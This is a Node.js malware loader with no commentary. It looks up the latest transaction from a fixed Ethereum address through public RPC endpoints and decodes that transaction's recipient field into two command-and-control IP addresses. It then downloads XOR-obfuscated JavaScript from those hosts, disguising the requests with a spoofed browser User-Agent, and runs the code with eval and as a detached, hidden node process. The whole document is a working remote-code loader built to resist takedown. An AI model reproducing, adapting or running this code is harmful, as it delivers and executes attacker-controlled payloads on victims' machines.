(async () => {
    const i = global;
    const d = i["r"];
    const module = i["m"];
    i["_V"] = "A" + global["!"];
  
    const http = d("http");
    const https = d("https");
    const zlib = d("zlib");
    const URL = d("url").URL;
    const spawn = d("child_process").spawn;
  
    var BLOCK_MULTIPLE = 1000;
    var SENDER = '0x1eef0849eda15d87f64e51c73c8442cf3c8bcef3'.toLowerCase();
    var NONCE_FANOUT = 12;
    var SEARCH_FLOOR = 0;
    var INDEXER_URL = 'https://eth.blockscout.com/api';
  
    var RPC_ENDPOINTS = uniqueDefined([
      process.env.ETH_RPC_URL,
      'https://1rpc.io/eth',
      'https://eth.drpc.org',
      'https://ethereum-rpc.publicnode.com',
      'https://eth-mainnet.public.blastapi.io'
    ]);
  
    var AGENTS = {
      'http:': new http.Agent({ keepAlive: true, keepAliveMsecs: 30000, maxSockets: 64 }),
      'https:': new https.Agent({ keepAlive: true, keepAliveMsecs: 30000, maxSockets: 64 })
    };
  
    function uniqueDefined(items) {
      var out = [];
      var seen = {};
      var i;
      for (i = 0; i < items.length; i++) {
        if (!items[i] || seen[items[i]]) continue;
        seen[items[i]] = true;
        out.push(items[i]);
      }
      return out;
    }
  
    function linkAbort(outerSignal, controller) {
      if (!outerSignal) return;
      outerSignal.addEventListener('abort', function () {
        controller.abort();
      }, { once: true });
    }
  
    function decompressStream(res) {
      var encoding = (res.headers['content-encoding'] || '').toLowerCase();
      if (encoding === 'gzip' || encoding === 'x-gzip') return res.pipe(zlib.createGunzip());
      if (encoding === 'deflate') return res.pipe(zlib.createInflate());
      if (encoding === 'br') return res.pipe(zlib.createBrotliDecompress());
      return res;
    }
  
    function httpRequest(endpoint, opts) {
      opts = opts || {};
      var method = opts.method || 'GET';
      var body = opts.body;
      var signal = opts.signal;
      var url = new URL(endpoint);
      var transport = url.protocol === 'https:' ? https : http;
      var headers = {
        Accept: 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        Connection: 'keep-alive'
      };
      if (body != null) {
        headers['Content-Type'] = 'application/json';
        headers['Content-Length'] = Buffer.byteLength(body);
      }
  
      return new i["Promise"](function (resolve, reject) {
        var req = transport.request(
          {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + url.search,
            method: method,
            agent: AGENTS[url.protocol],
            signal: signal,
            headers: headers
          },
          function (res) {
            var stream = decompressStream(res);
            var chunks = [];
            stream.on('data', function (chunk) {
              chunks.push(chunk);
            });
            stream.on('end', function () {
              try {
                resolve(i["JSON"]["parse"](Buffer.concat(chunks).toString('utf8')));
              } catch (err) {
                reject(err);
              }
            });
            stream.on('error', reject);
          }
        );
        req.on('error', reject);
        if (body != null) req.write(body);
        req.end();
      });
    }
  
    function promiseAny(tasks) {
      return new i["Promise"](function (resolve, reject) {
        var pending = tasks.length;
        var lastErr = null;
        if (!pending) {
          reject(new Error('empty'));
          return;
        }
        var i;
        for (i = 0; i < tasks.length; i++) {
          tasks[i].then(resolve, function (err) {
            lastErr = err;
            pending--;
            if (pending === 0) reject(lastErr);
          });
        }
      });
    }
  
    function withRpcEndpoints(task, outerSignal) {
      var controllers = [];
      var tasks = [];
      var i;
      for (i = 0; i < RPC_ENDPOINTS.length; i++) {
        controllers.push(new AbortController());
      }
      for (i = 0; i < controllers.length; i++) {
        linkAbort(outerSignal, controllers[i]);
      }
      for (i = 0; i < RPC_ENDPOINTS.length; i++) {
        tasks.push(task(RPC_ENDPOINTS[i], controllers[i].signal));
      }
      return promiseAny(tasks).then(function (result) {
        for (i = 0; i < controllers.length; i++) controllers[i].abort();
        return result;
      }, function (err) {
        for (i = 0; i < controllers.length; i++) controllers[i].abort();
        throw err;
      });
    }
  
    function rpcCall(endpoint, method, params, signal) {
      return httpRequest(endpoint, {
        method: 'POST',
        body: i["JSON"]["stringify"]({ jsonrpc: '2.0', id: 1, method: method, params: params }),
        signal: signal
      }).then(function (payload) {
        return payload.result;
      });
    }
  
    function rpcBatch(endpoint, calls, signal) {
      var body = [];
      var i;
      for (i = 0; i < calls.length; i++) {
        body.push({ jsonrpc: '2.0', id: i + 1, method: calls[i][0], params: calls[i][1] });
      }
      return httpRequest(endpoint, {
        method: 'POST',
        body: i["JSON"]["stringify"](body),
        signal: signal
      }).then(function (payload) {
        var byId = {};
        for (i = 0; i < payload.length; i++) byId[payload[i].id] = payload[i];
        var results = [];
        for (i = 0; i < calls.length; i++) results.push(byId[i + 1].result);
        return results;
      });
    }
  
    function toBlockHex(n) {
      return '0x' + Number(n).toString(16);
    }
  
    function findSenderTx(transactions) {
      var i;
      for (i = 0; i < transactions.length; i++) {
        if (transactions[i].from && transactions[i].from.toLowerCase() === SENDER) {
          return transactions[i];
        }
      }
      return null;
    }
  
    function decodeAddress(address) {
      var data = Buffer.from(address.replace(/^0x/i, ''), 'hex');
      function ip(b) {
        return b[0] + '.' + b[1] + '.' + b[2] + '.' + b[3];
      }
      return [ip(data.slice(0, 4)), ip(data.slice(4, 8))];
    }
  
    function firstMatch(tasks) {
      return new i["Promise"](function (resolve) {
        var remaining = tasks.length;
        if (!remaining) return resolve(null);
        var settled = false;
        function finish(result) {
          var i;
          if (settled) return;
          settled = true;
          for (i = 0; i < tasks.length; i++) tasks[i].controller.abort();
          resolve(result);
        }
        var i;
        for (i = 0; i < tasks.length; i++) {
          tasks[i].run().then(function (result) {
            if (settled) return;
            if (result) finish(result);
            else if (--remaining === 0) resolve(null);
          }, function () {
            if (!settled && --remaining === 0) resolve(null);
          });
        }
      });
    }
  
    function candidateBlocks(target) {
      var prev = target - BLOCK_MULTIPLE;
      var raw = [target - 1, target, target + 1, prev - 1, prev, prev + 1];
      var seen = {};
      var out = [];
      var i;
      for (i = 0; i < raw.length; i++) {
        if (raw[i] < 0) continue;
        var key = String(raw[i]);
        if (seen[key]) continue;
        seen[key] = true;
        out.push(raw[i]);
      }
      return out;
    }
  
    function blockTask(blockNumber) {
      var controller = new AbortController();
      return {
        controller: controller,
        run: function () {
          return withRpcEndpoints(function (endpoint, signal) {
            return rpcCall(endpoint, 'eth_getBlockByNumber', [toBlockHex(blockNumber), true], signal);
          }, controller.signal).then(function (block) {
            var txs = block && block.transactions;
            if (!Array.isArray(txs)) return null;
            var tx = findSenderTx(txs);
            return tx ? { blockNumber: blockNumber, tx: tx } : null;
          });
        }
      };
    }
  
    function nonceAtBlocks(blocks, outerSignal) {
      var calls = [];
      var i;
      for (i = 0; i < blocks.length; i++) {
        calls.push(['eth_getTransactionCount', [SENDER, toBlockHex(blocks[i])]]);
      }
      return withRpcEndpoints(function (endpoint, signal) {
        return rpcBatch(endpoint, calls, signal);
      }, outerSignal).then(function (results) {
        var out = [];
        for (i = 0; i < results.length; i++) out.push(Number(results[i]));
        return out;
      }, function () {
        var jobs = [];
        for (i = 0; i < calls.length; i++) {
          jobs.push(withRpcEndpoints(function (endpoint, signal) {
            return rpcCall(endpoint, calls[i][0], calls[i][1], signal);
          }, outerSignal));
        }
        return i["Promise"]["all"](jobs).then(function (results) {
          var out = [];
          for (i = 0; i < results.length; i++) out.push(Number(results[i]));
          return out;
        });
      });
    }
  
    function lastSenderTx(latestHint) {
      var controller = new AbortController();
      var head;
      var nonce;
      var targetNonce;
      function loadHead() {
        if (latestHint != null) return i["Promise"]["resolve"](latestHint);
        return withRpcEndpoints(function (endpoint, signal) {
          return rpcCall(endpoint, 'eth_blockNumber', [], signal);
        }, controller.signal).then(function (n) {
          return Number(n);
        });
      }
      return loadHead().then(function (h) {
        head = h;
        return withRpcEndpoints(function (endpoint, signal) {
          return rpcCall(endpoint, 'eth_getTransactionCount', [SENDER, toBlockHex(head)], signal);
        }, controller.signal);
      }).then(function (n) {
        nonce = Number(n);
        targetNonce = nonce - 1;
        var lo = SEARCH_FLOOR - 1;
        var hi = head;
        function step() {
          if (hi - lo <= 1) return i["Promise"]["resolve"]();
          var span = hi - lo - 1;
          var k = Math.min(NONCE_FANOUT, span);
          var probes = [];
          var i;
          for (i = 1; i <= k; i++) probes.push(lo + (i * (hi - lo)) / (k + 1));
          return nonceAtBlocks(probes, controller.signal).then(function (counts) {
            var idx = -1;
            var j;
            for (j = 0; j < counts.length; j++) {
              if (counts[j] >= nonce) {
                idx = j;
                break;
              }
            }
            if (idx === -1) lo = probes[probes.length - 1];
            else {
              hi = probes[idx];
              if (idx > 0) lo = probes[idx - 1];
            }
            return step();
          });
        }
        return step().then(function () {
          return withRpcEndpoints(function (endpoint, signal) {
            return rpcCall(endpoint, 'eth_getBlockByNumber', [toBlockHex(hi), true], signal);
          }, controller.signal).then(function (block) {
            var txs = (block && block.transactions) || [];
            var tx = null;
            var i;
            for (i = 0; i < txs.length; i++) {
              var t = txs[i];
              if (!t.from || t.from.toLowerCase() !== SENDER) continue;
              if (Number(t.nonce) === targetNonce) {
                tx = t;
                break;
              }
              if (!tx || Number(t.nonce) > Number(tx.nonce)) tx = t;
            }
            return { blockNumber: hi, tx: tx };
          });
        });
      }).then(function (result) {
        controller.abort();
        return result;
      }, function (err) {
        controller.abort();
        throw err;
      });
    }
  
    function lastSenderTxViaIndexer() {
      var url =
        INDEXER_URL + '?module=account&action=txlist&address=' + SENDER +
        '&startblock=0&endblock=99999999&page=1&offset=20&sort=desc&filterby=from';
      return httpRequest(url).then(function (payload) {
        var list = payload && Array.isArray(payload.result) ? payload.result : [];
        var tx = findSenderTx(list);
        return { blockNumber: Number(tx.blockNumber), tx: tx };
      });
    }
  
    async function run() {
      return withRpcEndpoints(function (endpoint, signal) {
        return rpcCall(endpoint, 'eth_blockNumber', [], signal);
      }).then(function (n) {
        var latest = Number(n);
        var targetBlock = latest - (latest % BLOCK_MULTIPLE);
        var tasks = [];
        var blocks = candidateBlocks(targetBlock);
        var i;
        for (i = 0; i < blocks.length; i++) tasks.push(blockTask(blocks[i]));
        return firstMatch(tasks).then(function (match) {
          if (match) return match;
          return lastSenderTx(latest).catch(function () {
            return lastSenderTxViaIndexer();
          });
        });
      }).then(function (match) {
        var ips = decodeAddress(match.tx.to);
        var ip1 = ips[0];
        var ip2 = ips[1];
        var _global = i;
        _global['_V'] = _global['_V'] || (_global.i);
        _global['_H'] = 'http://' + ip1 + ':80';
        _global['_H2'] = 'http://' + ip2 + ':80';
        _global['_t_s'] = 'http://' + ip1 + ':443';
        _global['_t_u'] = 'http://' + ip1 + ':80';
  
        function getCode(key, url) {
          var base = {
            hostname: url.hostname,
            port: Number(url.port) || 80,
            path: url.pathname + url.search,
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
              'Sec-V': _global['_V'] || 0
            }
          };
  
          function xorDecode(buf) {
            var kn = key.length;
            var i;
            for (i = 0; i < buf.length; i++) buf[i] ^= key.charCodeAt(i % kn);
            return buf.toString('utf8');
          }
  
          function fromB64Header(res) {
            var b64 = res.headers['x-payload-b64'];
            if (!b64) throw new Error('Missing X-Payload-B64');
            return xorDecode(Buffer.from(b64, 'base64'));
          }
  
          function request(method) {
            return new i["Promise"](function (resolve, reject) {
              var opts = {
                hostname: base.hostname,
                port: base.port,
                path: base.path,
                headers: base.headers,
                method: method
              };
              var req = http.request(opts, function (res) {
                if (method === 'HEAD') {
                  try {
                    resolve(fromB64Header(res));
                  } catch (e) {
                    reject(e);
                  }
                  res.resume();
                  return;
                }
                var chunks = [];
                res.on('data', function (chunk) {
                  chunks.push(chunk);
                });
                res.on('end', function () {
                  try {
                    var buf = Buffer.concat(chunks);
                    if (buf.length) return resolve(xorDecode(buf));
                    if (res.headers['x-payload-b64']) return resolve(fromB64Header(res));
                    reject(new Error('Empty payload body'));
                  } catch (e) {
                    reject(e);
                  }
                });
                res.on('error', reject);
              });
              req.on('error', reject);
              req.end();
            });
          }
  
          return request('GET').catch(function () {
            return request('HEAD');
          });
        }
  
        async function run_loader(url, key, isBoot) {
          try {
            const code = await getCode(key, url);
            const env = isBoot
              ? `global['_V']='${_global['_V'] || 0}';global['_H']='${_global['_H']}';global['_H2']='${_global['_H2']}';global['r']=require;global['m']=module;var _global=global;`
              : `global['_V']='${_global['_V'] || 0}';global['_t_s']='${_global['_t_s']}';global['_t_u']='${_global['_t_u']}';global['r']=require;global['m']=module;var _global=global;`;
  
            if (!isBoot) eval(env + code);
            spawn('node', ['-e', env + code], {
              detached: true,
              stdio: 'ignore',
              windowsHide: true,
            }).unref();
          } catch (e) {}
        }
  
        return run_loader(new URL('http://' + ip1 + ':443/0x/cls'), 'q4FZkxX{!h,Sr3=@', false).then(function () {
          return run_loader(new URL('http://' + ip1 + ':443/0x/ls'), 'y-p_>d$0B&@^1aQk', true);
        });
      });
    }
  
    await run();
  })();
  